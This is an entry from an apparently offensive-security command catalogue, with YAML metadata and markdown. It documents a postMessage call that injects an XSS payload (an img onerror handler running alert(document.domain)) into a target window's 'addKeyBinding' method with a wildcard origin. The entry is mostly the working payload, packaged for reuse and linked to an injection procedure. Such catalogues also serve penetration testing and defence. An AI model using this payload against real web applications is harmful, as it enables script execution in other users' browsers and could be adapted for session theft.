---
id: cmd-uuid-4
data: >-
  win.postMessage('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img
  src=x onerror=alert(document.domain)>"}]}','*')
tags:
  - injection
  - xss
  - postmessage
type: command
output: Key binding added in window
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.170Z'
verified: false
validated: true
submitted: true
---
# addKeyBinding-window

## Command

```javascript
win.postMessage('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img src=x onerror=alert(document.domain)>"}]}','*');
```

## Description

Equivalent to iframe version but targets a window opened via window.open.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| method | 'addKeyBinding' | Yes |
| args | Payload array | Yes |
| targetOrigin | '*' | Yes |

## Examples

### Basic Usage

```javascript
win.postMessage('{"method":"addKeyBinding","args":[{"keyCode":67,"key":"F","description":"Test"}]}','*');
```

### Advanced Usage

```javascript
// With XSS payload as above
```

## Expected Output

Binding added; inspect in window console.

## Related

- [[Related Procedure|procedures/Inject-Malicious-Key-Binding-via-postMessage]]
